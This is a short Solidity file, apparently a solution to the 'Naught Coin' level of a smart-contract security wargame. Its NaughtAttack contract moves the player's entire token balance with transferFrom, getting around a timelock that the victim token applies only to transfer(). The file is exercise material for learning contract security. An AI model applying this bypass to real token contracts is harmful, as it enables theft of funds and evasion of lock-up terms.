// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Naught.sol";

 contract NaughtAttack  {

    NaughtCoin victim;

    function attack(address _naught, address player) public {
        victim = NaughtCoin(_naught);
        uint amount = victim.balanceOf(player);
        victim.transferFrom(player, address(this), amount);
    }
 }